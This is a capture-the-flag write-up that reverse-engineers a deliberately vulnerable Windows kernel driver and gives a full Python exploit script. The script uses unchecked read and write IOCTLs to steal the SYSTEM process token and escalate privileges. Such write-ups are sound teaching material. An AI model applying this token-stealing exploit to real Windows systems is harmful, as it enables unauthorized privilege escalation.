---  
title: "cccamp23 pwn/SecureStorageDriver"  
publishDate: "18 Aug 2023"  
description: "Author: es3n1n"  
tags: ["pwn", "windows", "kernel", "cccamp23"]  
---

## Description  
Secure Storage Driver [481] \  
Category: Pwn \  
Difficulty: Medium \  
Author: Kolja, 0x4d5a \  
First Blood: cr3.mov \  
Solved By: cr3.mov, thehackerscrew

We implemented a driver to securely store our data in kernel space away from
prying eyes. What could go wrong?

## Overview

As soon as we unzip the provided files for the challenge we see that this task
consists of the 7 files:

### Contained files

* appjaillauncher-rs.exe  
* key.txt - A text file that contains the flag  
* start.bat - Challenge starter  
* KernelPwn_Exploit.exe - The user-mode part of the challenge  
* ntoskrnl.exe - One of the core window kernel files, it provided for the same reason why people are providing libc copies for the   
* KernelPwn.sys - The main driver that we're going to rev  
* KernelPwn.pdb - Debug symbols for the kernel part of this challenge

As we could immediately spot, we need to pwn a Windows kernel driver, so
without further interruptions let's start poking with the KernelPwn.sys

## Analyzing user-mode part

The user-mode part of this task is the one that we can interact with, i don't
want to go into much detail about how it worked, but here's a quick overview.

We clearly see that there are 3 types of things that we can do.  
```cpp  
       sub_140001020(  
         "[+] Options:\n"  
         "1) Write to secure storage at a specified offset\n"  
         "2) Read from secure storage at specified offset\n"  
         "3) Read flag (privileged opertion only!)\n"  
         "4) Quit\n");  
       sub_140001020("[+] Please choose an option\n");  
```

##### Write to secure storage at specified offset  
* Prompting for an u64 offset  
* Prompting for an u64 value that it's going to write  
* Sending IOCTL to the driver

##### Read from secure storage at specified offset  
* Prompting for an u64 offset  
* Sending IOCTL to the driver  
* Printing the u64 value that it read

##### Read flag (privileged operation only!)  
* Reads from the key.txt our flag and prints it, the catch here is that we don't have permission to open this file

#### Conclusion  
So what it's doing is just sending IOCTLs to the driver with the options that
we choose, knowing that we could pass a custom offset and values we already
can guess that we would need to exploit some kernel BOF to read/write from/to
addresses that we want, easy enough.

## Analyzing kernel mode part

#### DriverEntry

We load up the driver in ida and take a look at the DriverEntry function:

```cpp  
__int64 __fastcall DriverEntry(_DRIVER_OBJECT *DriverObject, _UNICODE_STRING
*RegistryPath)  
{  
 NTSTATUS v3; // [rsp+40h] [rbp-18h]  
 NTSTATUS SymbolicLink; // [rsp+40h] [rbp-18h]  
 PDEVICE_OBJECT DeviceObject; // [rsp+48h] [rbp-10h] BYREF

 DbgPrint_0("[+] PwnDriver was loaded\n");  
 secret_store = ExAllocatePool2(0x40i64, 0x48i64, 'Node');  
 if ( !secret_store )  
   return 1i64;  
 *(_QWORD *)(secret_store + 64) = secret_store;  
 DriverObject->DriverUnload = DriverCleanup;  
 DriverObject->MajorFunction[0] = CreateClose;  
 DriverObject->MajorFunction[2] = CreateClose;  
 DriverObject->MajorFunction[14] = DeviceControl;  
 v3 = IoCreateDevice(DriverObject, 0, &deviceName, 0x22u, 0, 0,
&DeviceObject);  
 if ( v3 >= 0 )  
 {  
   SymbolicLink = IoCreateSymbolicLink(&symlink, &deviceName);  
   if ( SymbolicLink >= 0 )  
   {  
     return 0i64;  
   }  
   else  
   {  
     _mm_lfence();  
     DbgPrint_0("[!] Failed to create symlink (0x%08X)\n", (unsigned int)SymbolicLink);  
     IoDeleteDevice(DeviceObject);  
     return (unsigned int)SymbolicLink;  
   }  
 }  
 else  
 {  
   _mm_lfence();  
   DbgPrint_0("[!] Failed to create Device Object (0x%08X)\n", (unsigned
int)v3);  
   return (unsigned int)v3;  
 }  
}  
```

The most interesting part for us is

* It's allocating a pool that it would use later in the code  
* Writing the pool address to the pool+64

#### IRP_MJ_CONTROL

When we are looking at the DeviceControl function we clearly see 2 types of
ioctls:

```cpp  
__int64 __fastcall DeviceControl(_DEVICE_OBJECT *DeviceObject, _IRP *Irp)  
{  
 unsigned int v3; // [rsp+20h] [rbp-48h]  
 __int64 LowPart; // [rsp+24h] [rbp-44h]  
 _NAMED_PIPE_CREATE_PARAMETERS *v5; // [rsp+28h] [rbp-40h]  
 _NAMED_PIPE_CREATE_PARAMETERS *Parameters; // [rsp+28h] [rbp-40h]  
 _IO_STACK_LOCATION *CurrentIrpStackLocation; // [rsp+30h] [rbp-38h]  
 unsigned __int64 offset; // [rsp+38h] [rbp-30h]  
 unsigned __int64 offseta; // [rsp+38h] [rbp-30h]  
 _QWORD *UserBuffer; // [rsp+40h] [rbp-28h]  
 unsigned __int64 value; // [rsp+48h] [rbp-20h]  
 unsigned __int64 v12; // [rsp+50h] [rbp-18h]

 CurrentIrpStackLocation = IoGetCurrentIrpStackLocation(Irp);  
 v3 = 0;  
 v12 = 0i64;  
 LowPart = CurrentIrpStackLocation->Parameters.Read.ByteOffset.LowPart;  
 if ( (_DWORD)LowPart != 0x80002003 )  
 {  
   if ( (_DWORD)LowPart != 0x80002007 )  
   {  
     v3 = -1073741808;  
     DbgPrint_0("[!] STATUS_INVALID_DEVICE_REQUEST\n");  
     goto LABEL_16;  
   }  
   DbgPrint_0("[+] PWNDRIVER_IOCTL_WRITE called\n");  
   if ( CurrentIrpStackLocation->Parameters.Create.Options >= 0x10ui64 )  
   {  
     Parameters = CurrentIrpStackLocation->Parameters.CreatePipe.Parameters;  
     if ( Parameters )  
     {  
       offseta = *(_QWORD *)&Parameters->NamedPipeType;  
       DbgPrint_0("[+] Offset: %llu\n", *(_QWORD *)&Parameters->NamedPipeType);  
       value = *(_QWORD *)&Parameters->CompletionMode;  
       DbgPrint_0("[+] value: %llu\n", value);  
       WriteEntry(offseta, value);  
       goto LABEL_16;  
     }  
     goto LABEL_7;  
   }  
LABEL_5:  
   v3 = -1073741789;  
   DbgPrint_0("[-] STATUS_BUFFER_TOO_SMALL\n");  
   goto LABEL_16;  
 }  
 DbgPrint_0("[+] PWNDRIVER_IOCTL_READ called\n");  
 if ( CurrentIrpStackLocation->Parameters.Create.Options < 0x10ui64 )  
   goto LABEL_5;  
 v5 = CurrentIrpStackLocation->Parameters.CreatePipe.Parameters;  
 if ( !v5 )  
 {  
LABEL_7:  
   v3 = 0xC000000D;  
   DbgPrint_0("[-] STATUS_INVALID_PARAMETER\n");  
   goto LABEL_16;  
 }  
 offset = *(_QWORD *)&v5->NamedPipeType;  
 DbgPrint_0("[+] Offset: %llu\n", *(_QWORD *)&v5->NamedPipeType);  
 if ( CurrentIrpStackLocation->Parameters.Read.Length >= 8ui64 )  
 {  
   UserBuffer = Irp->UserBuffer;  
   if ( UserBuffer )  
   {  
     *UserBuffer = ReadEntry(offset);  
     v12 = 8i64;  
   }  
   else  
   {  
     v3 = 0xC000000D;  
     DbgPrint_0("[!] STATUS_INVALID_PARAMETER\n");  
   }  
 }  
 else  
 {  
   v3 = 0xC0000023;  
   DbgPrint_0("[!] STATUS_BUFFER_TOO_SMALL\n");  
 }  
LABEL_16:  
 Irp->IoStatus.Status = v3;  
 Irp->IoStatus.Information = v12;  
 IofCompleteRequest(Irp, 0);  
 return v3;  
}  
```

##### PWNDRIVER_IOCTL_WRITE  
* Takes 2 u64 values (offset, value)  
* Debug printing these two values  
* Calls the WriteEntry function with these values

```cpp  
void __fastcall WriteEntry(unsigned __int64 offset, unsigned __int64 value)  
{  
 *(_QWORD *)(secret_store + 8 * offset) = value;  
}  
```

##### PWNDRIVER_IOCTL_READ  
* Takes 1 u64 value (offset)  
* Debug printing this value  
* Calls the ReadEntry function with this value

```cpp  
unsigned __int64 __fastcall ReadEntry(unsigned __int64 offset)  
{  
 return *(_QWORD *)(secret_store + 8 * offset);  
}  
```

#### Conclusion

As we clearly see there are no checks for the entry offsets, which means that
we could provide any data we want and read/write at any offsets from the
allocated pool we want.

## Exploit idea

The game plan here is that we are going to:

* Obtain the kernel base (that it prints for us)

* Obtain the process id (that it prints for us too)

* Read the EPROCESS of any system process that has privileged permissions(i.e read any file it wants)

* Find the EPROCESS of our process

* Swap the EPROCESS Token in our process with the systems one 

## Implementation

For the kernel base and process id we just need to read the input that the app
is sending us

```py  
kernel_base = int(io.recvline().decode().split(': ')[1], 16)  
process_id: int = int(io.recvline().decode().split(': ')[1])  
```

For the write/read functions we would need to pass an offset from the
allocated pool and the kernel part would automatically multiply this value by
8, so we should account for it in our calculations. \  
To make my life a bit easier i made these utils to interact with the user-mode
challenge part

```py  
def skip_options():  
   io.recvuntil(b'an option\r\n')

def read_at(off: int) -> int:  
   assert(off % 8 == 0)

   io.sendline(b'2')  
   io.recvline()  
   io.sendline(str(off // 8).encode())  
   io.recvline()  
   io.recvline()  
   v = int(io.recvline().decode().split('ead ')[1].strip())

   skip_options()  
   return v

def write_to(off: int, val: int) -> None:  
   assert(off % 8 == 0)

   io.sendline(b'1')  
   io.recvline()  
   io.sendline(str(off // 8).encode())  
   io.recvline()  
   io.sendline(str(val).encode())  
   io.recvline()  
   io.recvline()

   skip_options()  
```

There's nothing really fancy, it only converts our offsets to the indexes that
the km part would eventually convert to offsets by itself.

Now in order to account for the allocated pool address in our calculations we
first need to know its address, and luckily for us the driver has saved the
pool base at (pool + 64), so we can just read this value and thus we would
leak the pool address.

```py  
secret_store_base: int = read_at(64)  
```

I also made these utils that automatically convert virtual kernel addresses to
the offsets from our pool and write/reads from this address.

```py  
def read_at_va(va: int) -> int:  
   return read_at(va - secret_store_base)

def write_to_va(va: int, val: int) -> None:  
   write_to(va - secret_store_base, val)  
```

In order to obtain the eprocess address of some of the system processes we
could just use PsInitialSystemProcess export from ntoskrnl that we have on our
hands.

```py  
PsInitialSystemProcess_off = 0xD107E0  
PsInitialSystemProcess = read_at_va(kernel_base + PsInitialSystemProcess_off)  
```

We also need to find our process' eprocess. \  
In order to achieve that  we can iterate over the ActiveProcessLinks of the
system process, because this process is going to be the root system process
that every other process inherits.

```py  
ActiveProcessLinks_off = 0x448  
Pid_off = 0x440

def get_process(tgt_pid: int) -> int:  
   links = PsInitialSystemProcess + ActiveProcessLinks_off  
   head = links

   while True:  
       links = read_at_va(links + 8)  
       print('[*] links', hex(links))

       if links == head:  
           print('[!] LINKS == HEAD')  
           break

       eprocess = links - ActiveProcessLinks_off  
       print('[*] eprocess', hex(eprocess))

       pid = read_at_va(eprocess + Pid_off)  
       if pid != tgt_pid:  
           continue

       return eprocess

   return 0

target_eprocess = get_process(process_id)  
```

And at this point, we're almost ready to read the flag content, the only thing
we need to do is overwrite the Token value from our eprocess with the token
value from the system process.

```py  
system_token = read_at_va(PsInitialSystemProcess + Token_off)  
write_to_va(target_eprocess + Token_off, system_token)  
```

Then we just read the flag and we're done.  
```py  
io.sendline(b'3')  
io.interactive()  
```

## solve.py

```py  
from pwn import *

io = remote('xx.xx.xxx.xx', 4444)

kernel_base = int(io.recvline().decode().split(': ')[1], 16)  
process_id: int = int(io.recvline().decode().split(': ')[1])

print('[*] kernel_base:', hex(kernel_base))  
print('[*] pid', process_id)

def skip_options():  
   io.recvuntil(b'an option\r\n')

def read_at(off: int) -> int:  
   assert(off % 8 == 0)

   io.sendline(b'2')  
   io.recvline()  
   io.sendline(str(off // 8).encode())  
   io.recvline()  
   io.recvline()  
   v = int(io.recvline().decode().split('ead ')[1].strip())

   skip_options()  
   return v

def write_to(off: int, val: int) -> None:  
   assert(off % 8 == 0)

   io.sendline(b'1')  
   io.recvline()  
   io.sendline(str(off // 8).encode())  
   io.recvline()  
   io.sendline(str(val).encode())  
   io.recvline()  
   io.recvline()

   skip_options()

skip_options()  
secret_store_base: int = read_at(64)  
print('[*] secret_store_base', hex(secret_store_base))

def read_at_va(va: int) -> int:  
   return read_at(va - secret_store_base)

def write_to_va(va: int, val: int) -> None:  
   write_to(va - secret_store_base, val)

kernel_offset = kernel_base - secret_store_base  
print('[*] kernel_offset @', hex(kernel_offset))

print('[*] ok we are ready')

PsInitialSystemProcess_off = 0xD107E0  
ActiveProcessLinks_off = 0x448  
Token_off = 0x4b8  
Pid_off = 0x440

PsInitialSystemProcess = read_at_va(kernel_base + PsInitialSystemProcess_off)  
print('[*] [PsInitialSystemProcess] ->', hex(PsInitialSystemProcess))

system_token = read_at_va(PsInitialSystemProcess + Token_off)  
print('[*] system_token', hex(system_token))

def get_process(tgt_pid: int) -> int:  
   links = PsInitialSystemProcess + ActiveProcessLinks_off  
   head = links

   while True:  
       links = read_at_va(links + 8)  
       print('[*] links', hex(links))

       if links == head:  
           print('[!] LINKS == HEAD')  
           break

       eprocess = links - ActiveProcessLinks_off  
       print('[*] eprocess', hex(eprocess))

       pid = read_at_va(eprocess + Pid_off)  
       if pid != tgt_pid:  
           continue

       return eprocess

   return 0

target_eprocess = get_process(process_id)  
print('[*] target_eprocess', hex(target_eprocess))

print('[*] overwriting token *crossed fingers*')  
write_to_va(target_eprocess + Token_off, system_token)

print('[*] reading the flag')  
io.sendline(b'3')  
io.interactive()  
```

## Flag

Left as an exercise for the reader (i forgot to save it)  

Original writeup (https://cr3.mov/posts/cccamp23-pwn-securestore/).